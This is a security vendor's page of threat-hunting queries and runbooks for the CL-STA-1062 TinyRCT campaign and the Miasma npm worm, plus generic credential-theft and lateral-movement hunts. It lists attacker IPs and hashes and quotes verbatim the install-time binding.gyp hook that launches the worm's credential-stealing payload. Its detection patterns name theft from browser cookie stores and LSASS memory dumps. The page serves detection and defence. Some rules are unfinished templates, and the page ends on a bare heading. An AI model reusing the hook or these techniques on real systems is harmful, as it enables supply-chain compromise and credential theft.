TinyRCT AppDomainManager injection via chrome_setup.exe loading MyAppDomainManager.dll AIInstallation High
Hunts the CL-STA-1062 .NET AppDomainManager hijack where a legitimate signed chrome_setup.exe is forced (via chrome_setup.exe.config) to load the rogue MyAppDomainManager.dll, which acts as a downloader. Article-specific because the bespoke DLL/config filenames are unique to this campaign's loader. Rationale: Pivots on the campaign-unique filenames MyAppDomainManager.dll and chrome_setup.exe.config named directly by Unit 42 and cross-confirmed in their technical report; AppDomainManager hijack of a signed binary is near-zero in benign use. Cross-checked against: • https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/ • https://cybersecuritynews.com/cl-sta-1062-hackers-use-tinyrct-backdoor/
ATT&CKT1574.014 T1105
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Visual Studio / .NET SDK developers using legitimately named AppDomainManager assemblies during local debugging
  • Internal .NET applications that legitimately ship a custom AppDomainManager via app.config (rare in enterprise endpoints)
  • Security tooling that loads instrumentation DLLs with similar naming conventions
  • Software packaging/repackaging tools that emit a transient .exe.config alongside an installer
Suppression filter
| where not(InitiatingProcessFolderPath has @"\Microsoft Visual Studio\" or InitiatingProcessFolderPath has @"\dotnet\sdk\")
Response runbook
1) Triage: confirm the loading process path/signature of chrome_setup.exe and the load location of MyAppDomainManager.dll; pull the DLL SHA256 and detonate/VT it. 2) Contain: isolate the host, kill the loader process tree, and quarantine MyAppDomainManager.dll and chrome_setup.exe.config; block outbound to 139.180.134.221. 3) Hunt: search the host for PerfWatson2.exe drops and outbound connections to 45.32.113.172, and sweep the fleet for the same DLL/config filenames.
DeviceImageLoadEvents
| where Timestamp > ago(30d)
| where FileName =~ "MyAppDomainManager.dll"
| where not(InitiatingProcessFolderPath has @"\Microsoft Visual Studio\")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, DllName=FileName, DllPath=FolderPath, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName in~ ("MyAppDomainManager.dll","chrome_setup.exe.config")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileSHA256
| order by TimeGenerated desc

ASPX web shell execution: IIS w3wp.exe spawning shell/recon child processes AIInstallation High
Detects CL-STA-1062's ASPX web-shell foothold by flagging the IIS worker process w3wp.exe spawning command shells or recon LOLBins. Article-specific to the initial-access vector where web shells facilitate recon and outbound callbacks from compromised internet-facing servers. Rationale: Uses the article's stated initial-access vector (ASPX web shells on internet-facing servers driving recon/outbound callbacks) expressed as the high-fidelity w3wp.exe→shell/recon process-tree pivot; legitimate IIS rarely spawns these children. Cross-checked against: • https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/ • https://blog.talosintelligence.com/uat-7237-targets-web-hosting-infra/
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Web application monitoring/health-check scripts that shell out via the app pool
  • Legitimate admin maintenance running cmd/powershell deployment tasks under the IIS identity
  • APM agents or backup jobs invoking net.exe/tasklist from a web context
  • Custom web apps that legitimately call sqlcmd.exe for reporting
Suppression filter
| where not(ProcessCommandLine has_any ("healthcheck","\\Monitoring\\","appcmd list"))
Response runbook
1) Triage: review the child ProcessCommandLine and the requesting URL/IP in the IIS logs (W3CIISLog) for the timeframe; identify the dropped .aspx in the web root. 2) Contain: take the affected app pool/site offline or isolate the server, capture and remove the web shell, and rotate any service-account/MS SQL credentials reachable from the host. 3) Hunt: pivot to outbound connections from the server to the campaign IPs and search for staged web-source-code archives (RAR) and SoftEther/VNT binaries.

TinyRCT C2 and downloader beacon to CL-STA-1062 infrastructure IPs AICommand & Control Medium
Alerts on any host connecting to the campaign's hardcoded infrastructure: TinyRCT C2 (45.32.113.172), the loader's download server (139.180.134.221), and SoftEther/VNT tunneling infrastructure (202.182.102.5, 45.76.210.43). High-fidelity because these are fixed, corroborated campaign IOCs. Rationale: Direct match on four corroborated campaign IPs (C2 45.32.113.172 and downloader 139.180.134.221 named in the body; SoftEther/VNT infra from the IOC bundle) — fixed infrastructure IOCs are inherently high-fidelity and surface the initiating process for pivoting. Cross-checked against: • https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/ • https://www.infosecurity-magazine.com/news/china-hackers-asian-cni-backdoor/
ATT&CKT1071.001 T1573.001 T1105
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel researchers or sandbox detonation hosts intentionally connecting to the IOC IPs
  • Shared Vultr hosting IP later reassigned to a benign service (validate against current passive DNS)
  • Security scanners/EDR validation tooling probing the known-bad IPs
  • VPN/proxy infrastructure coincidentally rehosted on the same address block
Suppression filter
| where not(DeviceName has_any ("SANDBOX","MALWARE-LAB","DETONATE"))
Response runbook
1) Triage: identify the InitiatingProcess making the connection — confirm whether it is PerfWatson2.exe or a masqueraded VMware/XDR binary; note beacon cadence (~10s GET). 2) Contain: block the four IPs at the firewall/proxy, isolate the host, and capture memory before reboot. 3) Hunt: sweep all hosts for connections to these IPs, look for the AppDomainManager loader artifacts and SoftEther/VNT/Yuze tooling, and review MS SQL/web-root data access for exfil.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP in ("45.32.113.172","139.180.134.221","202.182.102.5","45.76.210.43")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where DstIpAddr in ("45.32.113.172","139.180.134.221","202.182.102.5","45.76.210.43")
| project TimeGenerated, DvcHostname, SrcIpAddr, DstIpAddr, DstPortNumber, NetworkApplicationProtocol, Url, DvcAction
| order by TimeGenerated desc

Masquerading: VMware/XDR/PerfWatson binaries from non-standard paths AIInstallation Medium
Detects CL-STA-1062 tooling disguised as trusted VMware or XDR binaries (vmtools.exe, vmwared.exe, XDRAgent.exe, PerfWatson2.exe) executing from paths or with publisher metadata that don't match the legitimate products. Article-specific to the group's masquerading defense-evasion technique. Rationale: Targets the exact masquerade filenames Unit 42 listed (XDRAgent.exe, vmtools.exe, vmwared.exe) plus the TinyRCT payload name PerfWatson2.exe, gated on path/publisher mismatch so legitimate VMware Tools and Visual Studio telemetry are excluded. Cross-checked against: • https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/
ATT&CKT1036.005
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Genuine VMware Tools (vmtools.exe) running from a non-default install path after a custom deployment
  • Visual Studio's legitimate PerfWatson2.exe executing from a non-standard developer toolchain path
  • Third-party XDR/EDR product legitimately shipping an XDRAgent.exe binary in the environment
  • Software-distribution staging directories temporarily holding signed VMware binaries
Suppression filter
| where SHA256 in ("00e09754526d0fe836ba27e3144ae161b0ecd3774abec5560504a16a67f0087c","f34bd1d485de437fe18360d1e850c3fd64415e49d691e610711d8d232071a0b1","dce5df29bddff5a4ddaea5c4fec14da91f7b69063a6e1c45ed61e5da4fc6c87b","cbfe8de6ffadbb1d396f61e63eb18e8b11c29527c1528641e3223d4c516cf7c3","4e1f8888d020decd09799ec946f1bf677cac6612b24582ddbf4d8ede425d8384","9b481b69cd91b09fa7bae7428f646dd89473a4c03393e43da81fe756cde1c472") or ProcessVersionInfoCompanyName == ""
Response runbook
1) Triage: check the binary's signature, publisher (CompanyName), and SHA256 against the campaign hashes; verify the parent process and folder path. 2) Contain: if unsigned or hash matches, isolate the host, kill and quarantine the binary, and block its C2 (45.32.113.172). 3) Hunt: enumerate SoftEther VPN, VNT, and Yuze SOCKS5 components on the host, review for unexpected VPN/proxy tunnels, and sweep the fleet for the same filename-from-wrong-path pattern.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("vmtools.exe","vmwared.exe","XDRAgent.exe","PerfWatson2.exe")
| where not(FolderPath has @"\VMware\" and ProcessVersionInfoCompanyName has "VMware")
| where not(FileName =~ "PerfWatson2.exe" and FolderPath has @"\Microsoft Visual Studio\" and ProcessVersionInfoCompanyName has "Microsoft")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessVersionInfoCompanyName, ProcessVersionInfoProductName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessName has_any ("vmtools.exe","vmwared.exe","XDRAgent.exe","PerfWatson2.exe")
| where not(TargetProcessName endswith "PerfWatson2.exe" and TargetProcessFileCompany has "Microsoft")
| where not(TargetProcessFileCompany has "VMware")
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessFileCompany, ActingProcessName, ActingProcessCommandLine, TargetProcessCommandLine
| order by TimeGenerated desc

CL-STA-1062 / TinyRCT toolset known-bad SHA256 execution or file write AIInstallation Medium
High-confidence alert matching the six corroborated CL-STA-1062 file hashes (TinyRCT and toolset) across process execution, file writes, and DLL loads. A direct IOC sweep for the campaign's binaries. Rationale: Direct sweep on the six pre-extracted SHA256 IOCs across execution, file-write, and DLL-load telemetry; hash matches are the highest-fidelity signal available and need no behavioural context. Cross-checked against: • https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/
ATT&CKT1105 T1036.005
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel/sandbox host with the samples staged for analysis
  • Legitimate AV/EDR quarantine store retaining a copy of a detected sample (file-write event on the quarantine path)
  • Security-team retro-hunt importing the samples to a forensic workstation
  • Hash collision is cryptographically negligible — effectively no benign FP outside lab handling
Suppression filter
| where not(DeviceName has_any ("SANDBOX","MALWARE-LAB","FORENSIC","QUARANTINE"))
Response runbook
1) Triage: confirm the host is not a known malware-analysis/quarantine system; capture the file path, parent process, and first-seen time. 2) Contain: isolate the host, kill/quarantine the matching binary, and block 45.32.113.172 / 139.180.134.221. 3) Hunt: pivot from the host to lateral-movement infra (202.182.102.5, 45.76.210.43), look for the AppDomainManager loader and web-shell artifacts, and sweep the fleet for all six hashes.

union DeviceProcessEvents, DeviceFileEvents, DeviceImageLoadEvents
| where Timestamp > ago(30d)
| where SHA256 in (badHashes)
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("45.32.113.172", "139.180.134.221", "202.182.102.5", "45.76.210.43") or RemoteUrl has_any ("")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic(["45.32.113.172", "139.180.134.221", "202.182.102.5", "45.76.210.43"]);
let BadDomains = dynamic([""]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

title: Outbound Connection to Article-Named IP / Domain
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0f
status: experimental
description: |
    Replace `__IP_LIST__` / `__DOMAIN_LIST__` placeholders with
    article-specific destinations. For dynamic IOC management, use a
    watchlist or external feed.
references:

author: Clankerusecase
date: 2026/05/02
tags:
    - attack.command-and-control
logsource:
    category: network_connection
    product: windows

    selection_ip:
        DestinationIp:
            - '__IP_PLACEHOLDER_1__'
            - '__IP_PLACEHOLDER_2__'
    selection_domain:
        DestinationHostname:
            - '__DOMAIN_PLACEHOLDER_1__'
            - '__DOMAIN_PLACEHOLDER_2__'

falsepositives:

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d04
status: experimental
description: |
    Anything opening lsass.exe with read-memory access that isn't a
    Microsoft signed component (Defender, csrss, etc.) is suspect.
    Mimikatz / Pypykatz / nanodump signature.
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1003.001
    - attack.credential-access
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
    filter_known_good:
        SourceImage|endswith:
            - '\MsSense.exe'
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\svchost.exe'
            - '\wininit.exe'
            - '\services.exe'
            - '\lsm.exe'
            - '\SearchProtocolHost.exe'
    condition: selection and not filter_known_good
falsepositives:
    - Third-party EDR / forensic tools — extend the filter list
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688            // process-create (audit-policy required)
| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that
    pivots over SMB. Pair with `wmic /node:` for the full cluster.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1021.002
    - attack.t1569.002
    - attack.lateral-movement
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_psexec:
        Image|endswith:
            - '\psexec.exe'
            - '\psexec64.exe'
            - '\psexesvc.exe'
            - '\paexec.exe'
            - '\csexec.exe'
            - '\remcom.exe'
            - '\smbexec.py'
    selection_wmic_remote:
        Image|endswith:
            - '\wmic.exe'
        CommandLine|contains:
            - '/node:'
    condition: selection_psexec or selection_wmic_remote
falsepositives:
    - Sysadmins running approved remote-management tooling — wrap with
      a known-admin-host watchlist
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name

Multiple @immobiliarelabs Backstage Plugins Compromised on npm

StepSecurity
2026-06-26 12 use cases 3 techniques 5 kill-chain phases detected

Compromised versions run a malicious payload at npm install time through a binding.gyp node-gyp hook, harvesting credentials from sources like GitHub Actions secrets, cloud provider keys, and package registry tokens, while trying to persist in AI coding assistant configs. Static analysis of version 2.1.2 against the clean 2.1.1 release revealed a new 5 MB index.js and an added binding.gyp, both absent from earlier releases.

Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Cloud instance-metadata harvesting from npm/node install context (Miasma credential theft)
Phantom Gyp binding.gyp install-time payload execution (Miasma npm worm) AIInstallation High
Hunts the GYP command-expansion shell invocation that the Miasma/Phantom Gyp worm plants in binding.gyp to run the 5 MB index.js during node-gyp configure, bypassing scripts.postinstall monitoring. The exact source line is '<!(node index.js > /dev/null 2>&1 && echo stub.c)', so a process command line carrying both 'node index.js' and 'echo stub.c' is the worm firing. Rationale: Anchored on the verbatim binding.gyp source string '<!(node index.js > /dev/null 2>&1 && echo stub.c)' from the article; the 'node index.js' + 'echo stub.c' pairing is unique to the Phantom Gyp configure-step trick and not a legitimate gyp pattern. Cross-checked against: • https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm • https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp/ • https://semgrep.dev/blog/2026/miasma-v2-self-spreading-npm-worm-now-uses-malicious-bindinggyp-file-and-compromises-57-packages/
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate native addon packages whose binding.gyp uses node-based command expansion (rare; almost never invokes a bare index.js with echo stub.c)
  • Security researcher detonating the sample in a sandbox
  • CI job intentionally re-running the malicious tarball for analysis
  • A developer's own gyp build script that happens to echo a stub source file
Response runbook
1) Triage: pull the full ProcessCommandLine and the parent chain (npm/node-gyp/sh) and identify which @immobiliarelabs (or other) package was being installed; confirm a 5 MB index.js + binding.gyp exist in that package dir. 2) Contain: isolate the host/runner, revoke any tokens that were live in that session (GitHub, npm, cloud), and rotate CI secrets exposed to the job. 3) Hunt: search the same host for a Bun binary in temp, IMDS (169.254.169.254) hits, and writes to AI-assistant configs (.claude/settings.json etc.); pivot org-wide on the affected package@version.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has_all ("node index.js", "echo stub.c")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, FolderPath
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessCommandLine has_all ("node index.js", "echo stub.c")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Bun runtime executing a temp payload spawned by node (Miasma Node.js-monitoring evasion) AIExploitation Medium
Hunts the deliberate runtime switch where the Miasma loader downloads Bun (bun-v1.3.13) and runs the decrypted credential-harvester from a randomly named temp file under Bun instead of Node, to evade --require-hook security tooling. A bun process whose parent is node/npm/node-gyp/sh and that executes a file from /tmp or /var/folders is the second stage. Rationale: Uses the article's explicit detail that the loader downloads Bun (bun-v1.3.13) and executes the decrypted main payload from a randomly named temp file under Bun specifically to dodge Node's --require interception; node-parent + bun-child + temp path is the distinguishing shape. Cross-checked against: • https://cybersecuritynews.com/miasma-malware-uses-binding-gyp-and-bun/ • https://www.wiz.io/blog/miasma-supply-chain-attack-targeting-redhat-npm-packages • https://thehackernews.com/2026/06/miasma-malware-targets-npm-packages-and.html
ATT&CKT1027 T1059.007 T1620
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Developers who legitimately use Bun as their runtime/test-runner invoked from npm scripts
  • Bun-based build tooling executing cached transpiled output from a temp dir
  • Monorepo task runners (turbo/nx) shelling out to bun for a subpackage
  • CI images that prewarm Bun and run scratch scripts from /tmp
Response runbook
1) Triage: capture the temp file path bun executed and hash it; check whether the project legitimately depends on Bun (package.json/engines) — a Bun execution with no Bun dependency declared is high-signal. 2) Contain: isolate the host, kill the bun process tree, and quarantine the temp payload before it self-deletes. 3) Hunt: correlate to a binding.gyp install in the prior 5 minutes, then look for IMDS/metadata access and AI-assistant config writes from the same session.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "bun" or FileName startswith "bun-"
| where InitiatingProcessFileName in~ ("node","sh","bash","dash","npm","node-gyp","yarn","pnpm")
| where ProcessCommandLine has_any ("/tmp/","/var/folders/","/var/tmp/") or FolderPath has_any ("/tmp/","/var/folders/")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName has "bun"
| where ParentProcessName has_any ("node","sh","bash","dash","npm","node-gyp","yarn","pnpm")
| where ActingProcessCommandLine has_any ("/tmp/","/var/folders/","/var/tmp/")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName
| order by TimeGenerated desc

Miasma infectHost persistence in AI coding assistant configs AIInstallation Medium
